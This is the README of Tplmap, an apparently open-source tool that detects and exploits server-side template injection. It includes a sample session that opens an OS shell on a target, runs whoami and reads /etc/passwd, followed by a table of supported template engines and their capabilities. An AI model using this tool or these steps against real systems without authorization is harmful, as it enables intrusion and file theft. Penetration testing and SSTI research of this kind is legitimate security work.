Tplmap
======

Tplmap (short for _Template Mapper_) is a tool that automate the process of detecting and exploiting Server-Side Template Injection vulnerabilities (SSTI). 

This can be used by developers, penetration testers, and security researchers to detect and exploit vulnerabilities related to the template injection attacks.

The technique can be used to compromise web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

The modular approach allows any contributor to extend the support to other templating engines or introduce new exploitation techniques. The majority of the techniques currently implemented came from the amazing research done by [James Kett, PortSwigger][1].

> The application is currently under heavy development and misses some functionalities.

Example
--------

```
$ ./tplmap.py -u 'http://www.target.com/?id=*'
[+] Found placeholder in GET parameter 'inj'
[+] Testing reflection with tag ${} and variances to escape code context
[+] Confirmed reflection with tag '${}' by Mako plugin
[+] Confirmed reflection with tag '${}' by Freemarker plugin
[+] Tplmap identified the following injection point:

  Engine: Freemarker
  Template: ${}
  Context: text
  OS: linux
  Capabilities:
    Code evaluation: no
    OS command execution: yes
    File write: yes
    File read: yes

[+] Rerun tplmap providing one of the following options:
    --os-cmd or --os-shell to access the underlying operating system
    --file-write to upload files to the server
    --file-read to download remote files

$ ./tplmap.py -u 'http://www.target.com/?id=*' --os-shell
[+] Run commands on the operating system.
linux $ whoami
www-data
linux $ ls -al /etc/passwd
-rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
linux $
```

Supported template engines
--------------------------

| Template engine    | Detection | command execution | Code evaluation | File read | File write |
|--------------------|-----------|-------------------|-----------------|-----------|------------|
| Mako               |  yes      | yes               | python          | yes       | yes        |
| Jinja2             |  yes      | yes               | python          | yes       | yes        |
| Jade               |  yes      | yes               | javascript      | yes       | yes        |
| Smarty (unsecured) |  yes      | yes               | PHP             | yes       | yes        |
| Freemarker         |  yes      | yes               | no              | yes       | yes        |
| Velocity           |  yes      | no                | no              | no        | no         |
| Twig               |  yes      | no                | no              | no        | no         |
| Smarty (secured)   |  yes      | no                | no              | no        | no         |


[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
